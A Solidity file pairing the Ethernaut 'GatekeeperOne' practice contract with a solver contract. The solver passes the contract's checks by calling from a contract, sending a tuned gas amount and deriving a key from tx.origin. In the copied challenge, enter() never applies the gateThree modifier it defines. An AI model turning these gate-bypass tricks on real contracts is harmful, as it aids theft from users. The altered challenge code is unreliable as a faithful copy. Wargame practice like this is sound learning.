// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract GatekeeperOne {
  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(
      uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
      "GatekeeperOne: invalid gateThree part one"
    );
    require(
      uint32(uint64(_gateKey)) != uint64(_gateKey),
      "GatekeeperOne: invalid gateThree part two"
    );
    require(
      uint32(uint64(_gateKey)) == uint16(tx.origin),
      "GatekeeperOne: invalid gateThree part three"
    );
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract EnterContract {
  constructor(GatekeeperOne _gatekeeperOne) public {
    bytes8 gateKey = convertUintToBytes8(format(tx.origin));
    _gatekeeperOne.enter{ gas: 98546 }(gateKey);
  }

  function convertUintToBytes8(uint64 _value) public pure returns (bytes8 out) {
    bytes memory temp = abi.encodePacked(_value);
    assembly {
      out := mload(add(temp, 32))
    }
  }

  function format(address _addr) public pure returns (uint64) {
    return uint64(uint16(_addr)) + 17293822569102704640;
  }
}
